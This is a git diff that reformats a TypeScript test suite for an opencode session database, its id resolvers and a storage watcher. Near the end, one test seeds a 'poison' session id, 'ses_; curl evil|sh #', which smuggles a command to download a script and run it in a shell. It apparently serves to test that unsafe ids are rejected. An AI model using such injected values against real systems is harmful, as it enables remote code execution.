@@ -50,28 +50,44 @@ function seedFromExport(db: Database, exp: any, tBase = 1000): string {
   const info = exp.info;
   db.query(
     "INSERT INTO session (id, project_id, directory, title, version, slug, time_created, time_updated) VALUES (?,?,?,?,?,?,?,?)",
-  ).run(info.id, info.projectID ?? "global", info.directory ?? "/tmp/x", info.title ?? "t", info.version ?? "1.18.3", info.slug ?? "s", info.time?.created ?? tBase, info.time?.updated ?? tBase);
+  ).run(
+    info.id,
+    info.projectID ?? "global",
+    info.directory ?? "/tmp/x",
+    info.title ?? "t",
+    info.version ?? "1.18.3",
+    info.slug ?? "s",
+    info.time?.created ?? tBase,
+    info.time?.updated ?? tBase,
+  );
   exp.messages.forEach((m: any, i: number) => {
     const { id, ...rest } = m.info;
     const t = m.info.time?.created ?? tBase + i;
-    db.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run(id, info.id, t, t, JSON.stringify(rest));
+    db.query(
+      "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+    ).run(id, info.id, t, t, JSON.stringify(rest));
     (m.parts ?? []).forEach((p: any, j: number) => {
       const { id: pid, ...prest } = p;
-      db.query("INSERT INTO part (id, message_id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?,?)")
-        .run(pid, id, info.id, t, t, JSON.stringify(prest));
+      db.query(
+        "INSERT INTO part (id, message_id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?,?)",
+      ).run(pid, id, info.id, t, t, JSON.stringify(prest));
     });
   });
   return info.id;
 }
 
 function tmpDbPath(): string {
-  return path.join(os.tmpdir(), `oc-db-${Date.now()}-${Math.random().toString(36).slice(2, 8)}.db`);
+  return path.join(
+    os.tmpdir(),
+    `oc-db-${Date.now()}-${Math.random().toString(36).slice(2, 8)}.db`,
+  );
 }
 
 describe("assembleOpencodeSession (SQLite -> export shape)", () => {
   test("round-trips a real sanitized export through the DB and matches on parse", () => {
-    const exp = JSON.parse(fs.readFileSync(path.join(FIX, "session-tools.sanitized.json"), "utf-8"));
+    const exp = JSON.parse(
+      fs.readFileSync(path.join(FIX, "session-tools.sanitized.json"), "utf-8"),
+    );
     const dbPath = tmpDbPath();
     const db = new Database(dbPath);
     createSchema(db);
@@ -82,8 +98,9 @@ describe("assembleOpencodeSession (SQLite -> export shape)", () => {
     expect(assembled).not.toBeNull();
     // Parsing the DB-assembled blob equals parsing opencode's own export blob:
     // the SQL mapping reproduces the export shape.
-    expect(parseOpencodeSessionFile(assembled!))
-      .toEqual(parseOpencodeSessionFile(JSON.stringify(exp)));
+    expect(parseOpencodeSessionFile(assembled!)).toEqual(
+      parseOpencodeSessionFile(JSON.stringify(exp)),
+    );
 
     fs.rmSync(dbPath, { force: true });
   });
@@ -103,10 +120,18 @@ describe("session-id binding resolvers", () => {
     const dbPath = tmpDbPath();
     const db = new Database(dbPath);
     createSchema(db);
-    db.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
-      .run("ses_binder", "/tmp/proj-x", "t", 1, 1);
-    db.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run("msg_1", "ses_binder", 1, 1, JSON.stringify({ role: "user", time: { created: 1 } }));
+    db.query(
+      "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+    ).run("ses_binder", "/tmp/proj-x", "t", 1, 1);
+    db.query(
+      "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+    ).run(
+      "msg_1",
+      "ses_binder",
+      1,
+      1,
+      JSON.stringify({ role: "user", time: { created: 1 } }),
+    );
     db.close();
 
     expect(resolveOpencodeSessionCwd("ses_binder", dbPath)).toBe("/tmp/proj-x");
@@ -141,10 +166,22 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     const dbPath = tmpDbPath();
     const writer = new Database(dbPath);
     createSchema(writer);
-    writer.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
+    writer
+      .query(
+        "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+      )
       .run("ses_live", "/tmp/live", "t", 1000, 1000);
-    writer.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run("msg_u", "ses_live", 1000, 1000, JSON.stringify({ role: "user", time: { created: 1000 } }));
+    writer
+      .query(
+        "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+      )
+      .run(
+        "msg_u",
+        "ses_live",
+        1000,
+        1000,
+        JSON.stringify({ role: "user", time: { created: 1000 } }),
+      );
     writer.close();
 
     const watcher = new OpencodeStorageWatcher(dbPath, 100);
@@ -156,23 +193,57 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     // Assistant turn STARTS: a new message row without `completed` -> active.
     const now = Date.now();
     const w2 = new Database(dbPath);
-    const addPromise = waitForSession(watcher, (e) => e.sessionId === "ses_live");
-    w2.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run("msg_a", "ses_live", now, now, JSON.stringify({ role: "assistant", time: { created: now }, modelID: "big-pickle" }));
+    const addPromise = waitForSession(
+      watcher,
+      (e) => e.sessionId === "ses_live",
+    );
+    w2.query(
+      "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+    ).run(
+      "msg_a",
+      "ses_live",
+      now,
+      now,
+      JSON.stringify({
+        role: "assistant",
+        time: { created: now },
+        modelID: "big-pickle",
+      }),
+    );
     w2.close();
     const addEvent = await addPromise;
     expect(addEvent.filePath).toBe("ses_live"); // per-session debounce key
-    expect(classifyOpencodeTranscriptTail(assembleOpencodeSession("ses_live", dbPath)!)).toBe("active");
+    expect(
+      classifyOpencodeTranscriptTail(
+        assembleOpencodeSession("ses_live", dbPath)!,
+      ),
+    ).toBe("active");
 
     // Assistant turn COMPLETES: same row updated with `completed` -> idle.
     const later = now + 1;
     const w3 = new Database(dbPath);
-    const changePromise = waitForSession(watcher, (e) => e.sessionId === "ses_live");
-    w3.query("UPDATE message SET time_updated = ?, data = ? WHERE id = 'msg_a'")
-      .run(later, JSON.stringify({ role: "assistant", time: { created: now, completed: later }, modelID: "big-pickle", finish: "stop" }));
+    const changePromise = waitForSession(
+      watcher,
+      (e) => e.sessionId === "ses_live",
+    );
+    w3.query(
+      "UPDATE message SET time_updated = ?, data = ? WHERE id = 'msg_a'",
+    ).run(
+      later,
+      JSON.stringify({
+        role: "assistant",
+        time: { created: now, completed: later },
+        modelID: "big-pickle",
+        finish: "stop",
+      }),
+    );
     w3.close();
     await changePromise;
-    expect(classifyOpencodeTranscriptTail(assembleOpencodeSession("ses_live", dbPath)!)).toBe("idle");
+    expect(
+      classifyOpencodeTranscriptTail(
+        assembleOpencodeSession("ses_live", dbPath)!,
+      ),
+    ).toBe("idle");
 
     watcher.stop();
     clearPosition(dbPath);
@@ -186,10 +257,21 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     const w = new Database(dbPath);
     createSchema(w);
     // Session A already exists and was accounted for by a prior run.
-    w.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
-      .run("ses_A", "/tmp/a", "t", 1000, 1000);
-    w.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run("msg_a1", "ses_A", 1000, 1000, JSON.stringify({ role: "assistant", time: { created: 1000, completed: 1000 } }));
+    w.query(
+      "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+    ).run("ses_A", "/tmp/a", "t", 1000, 1000);
+    w.query(
+      "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+    ).run(
+      "msg_a1",
+      "ses_A",
+      1000,
+      1000,
+      JSON.stringify({
+        role: "assistant",
+        time: { created: 1000, completed: 1000 },
+      }),
+    );
     w.close();
 
     // Daemon run #1: first poll backfills A and PERSISTS the watermark past it.
@@ -202,10 +284,21 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     // While DOWN: session B runs start-to-finish (completed), advancing the DB past
     // the persisted watermark. No watcher is running, so nothing observes it live.
     const w2 = new Database(dbPath);
-    w2.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
-      .run("ses_B", "/tmp/b", "t", 2000, 2000);
-    w2.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run("msg_b1", "ses_B", 2000, 2000, JSON.stringify({ role: "assistant", time: { created: 2000, completed: 2000 } }));
+    w2.query(
+      "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+    ).run("ses_B", "/tmp/b", "t", 2000, 2000);
+    w2.query(
+      "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+    ).run(
+      "msg_b1",
+      "ses_B",
+      2000,
+      2000,
+      JSON.stringify({
+        role: "assistant",
+        time: { created: 2000, completed: 2000 },
+      }),
+    );
     w2.close();
 
     // Daemon run #2 (restart): loads the persisted watermark and MUST emit B, but
@@ -232,10 +325,21 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     const dbPath = tmpDbPath();
     const w = new Database(dbPath);
     createSchema(w);
-    w.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
-      .run("ses_A", "/tmp/a", "t", 1000, 1000);
-    w.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
-      .run("msg_a1", "ses_A", 1000, 1000, JSON.stringify({ role: "assistant", time: { created: 1000, completed: 1000 } }));
+    w.query(
+      "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+    ).run("ses_A", "/tmp/a", "t", 1000, 1000);
+    w.query(
+      "INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)",
+    ).run(
+      "msg_a1",
+      "ses_A",
+      1000,
+      1000,
+      JSON.stringify({
+        role: "assistant",
+        time: { created: 1000, completed: 1000 },
+      }),
+    );
     w.close();
 
     let queries = 0;
@@ -269,21 +373,30 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     const dbPath = tmpDbPath();
     const w = new Database(dbPath);
     createSchema(w);
-    w.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
-      .run("ses_08f9926d3ffelzGS3Q3CteaeUk", "/tmp/a", "t", 1000, 1000);
+    w.query(
+      "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+    ).run("ses_08f9926d3ffelzGS3Q3CteaeUk", "/tmp/a", "t", 1000, 1000);
     w.close();
 
     let release!: () => void;
-    const blocked = new Promise<void>((r) => { release = r; });
+    const blocked = new Promise<void>((r) => {
+      release = r;
+    });
     let started = false;
     const queryDelta = async () => {
       started = true;
       await blocked;
-      return { globalMax: 1000, sessionIds: ["ses_08f9926d3ffelzGS3Q3CteaeUk"] };
+      return {
+        globalMax: 1000,
+        sessionIds: ["ses_08f9926d3ffelzGS3Q3CteaeUk"],
+      };
     };
 
     const watcher = new OpencodeStorageWatcher(dbPath, 50, { queryDelta });
-    const saw = waitForSession(watcher, (e) => e.sessionId === "ses_08f9926d3ffelzGS3Q3CteaeUk");
+    const saw = waitForSession(
+      watcher,
+      (e) => e.sessionId === "ses_08f9926d3ffelzGS3Q3CteaeUk",
+    );
     watcher.start();
     await new Promise((r) => setTimeout(r, 80));
     expect(started).toBe(true);
@@ -307,8 +420,9 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     const good = "ses_08f9926d3ffelzGS3Q3CteaeUk";
     const poison = "ses_; curl evil|sh #";
     for (const id of [good, poison]) {
-      db.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
-        .run(id, "/tmp/x", "t", 2000, 2000);
+      db.query(
+        "INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)",
+      ).run(id, "/tmp/x", "t", 2000, 2000);
     }
     db.close();
 
